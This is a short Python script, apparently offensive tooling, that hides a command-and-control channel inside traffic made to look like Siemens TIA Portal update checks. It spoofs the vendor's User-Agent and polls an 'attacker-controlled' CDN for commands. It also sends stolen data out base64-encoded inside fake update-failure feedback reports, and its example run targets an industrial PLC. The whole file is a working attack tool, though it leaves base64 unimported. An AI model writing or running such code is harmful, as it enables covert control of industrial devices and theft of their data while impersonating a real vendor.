# vendor_portal_c2.py - Disguise C2 as vendor support traffic
import requests
import time

class VendorPortalC2:
    def __init__(self, vendor_domain="support.siemens.com"):
        self.vendor_domain = vendor_domain
        self.session = requests.Session()

    def beacon(self, device_id):
        """
        Beacon disguised as legitimate update check
        """
        # Appear as Siemens TIA Portal checking for updates
        headers = {
            'User-Agent': 'Siemens TIA Portal V17 Update Service',
            'X-Device-ID': device_id,
            'X-Product-Version': '17.0.0.1'
        }

        # Real Siemens update servers mixed with attacker C2
        update_urls = [
            f"https://{self.vendor_domain}/api/updates/check",  # Legitimate
            f"https://cdn.{self.vendor_domain}/updates/manifest.json",  # Attacker-controlled CDN
        ]

        for url in update_urls:
            response = self.session.get(url, headers=headers, timeout=30)

            if response.status_code == 200 and 'command' in response.json():
                # Attacker server returned command
                return response.json()['command']

            time.sleep(5)  # Slow requests to appear normal

        return None

    def exfiltrate_via_update_feedback(self, data):
        """
        Exfiltrate data disguised as update installation feedback
        """
        feedback_url = f"https://{self.vendor_domain}/api/feedback"

        # Encode stolen data in "error report"
        feedback = {
            'status': 'error',  # Fake error to justify large data
            'error_code': 'E_UPDATE_FAILED',
            'diagnostic_data': base64.b64encode(data).decode(),
            'timestamp': time.time()
        }

        self.session.post(feedback_url, json=feedback)
        print("[+] Data exfiltrated via vendor feedback channel")

# Usage
vendor_c2 = VendorPortalC2("update.siemens.com")
command = vendor_c2.beacon("PLC-12345")
if command:
    print(f"[+] Received command: {command}")
